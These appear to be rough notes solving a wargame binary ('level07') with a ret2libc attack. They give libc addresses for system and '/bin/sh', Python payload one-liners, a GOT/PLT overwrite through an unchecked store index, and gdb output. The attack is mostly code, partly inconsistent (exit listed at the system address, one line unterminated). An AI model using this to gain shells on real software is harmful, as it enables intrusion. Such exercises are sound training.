addr of "/bin/sh" : 0xf7f897ec
addr of system: 0xf7e6aed0
addr of exit: 0xf7e6aed0

Ret2libc code:

```
python -c 'print "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "
```

We need to be able to put this code in a place where it can be executed later on.
Command[20] could allow us to store this ret2libc as the commands are quite short and no check is performed on these adresses

To do so we can first call for a garbage command to prefix our shellcode

```
python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n"'
```

This should allow us to be able to then call "store" command and pass an index without touching to the ret2libc code contained in command[20]

The data we want to store using "store" needs to be put at an index that will be executed.
To do so we can override the address of the plt of a function
-> stack_check_fail : 0x804a010
-> printf : 0x804a000
-> fgets : 0x804a00c

```
(python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + "<addr of buffer command>"[::-1] + "\n" + "diff between addr of data_storage and printf plt"' ; cat) | ./level07
(python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + "4294956639" + "\n" + "4160435336"' ; cat) | ./level07
```

Address of buffer command:
0xffffd658 = 4294956632 in decimal

Address of buffer data_storage:

```
(gdb) ni 1
0x08048659 in store_number ()
(gdb) focus cmd
Focus set to CMD window.
(gdb) x/x $ebp-0x10
0xffffd488:     0xffffd65f
```

Difference between 0xffffd488 and 0x804a000 :
0xF7FB3488 = 4160435336 in decimal %3 = 2 GOOD

<!-- Difference between 0xffffd488 and 0x804a00c : -->
<!-- 0xF7FB35E8 = 4160435688 in decimal %3 = 0 KO -->

<!-- NICE -->
<!-- Difference between 0xffffd488 and 0x804a010: -->
<!-- 0xF7FB35E4 = 4160435684 in decimal %3 = 2 GOOD -->

TO RUN STDIN PYTHON INSIDE GDB:
run < <(python -c 'print "AAAAAA" + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xf8\x97\xec"[::-1] + "\n" + "store" + "\n" + "4294956639" + "\n" + "4160435336"')
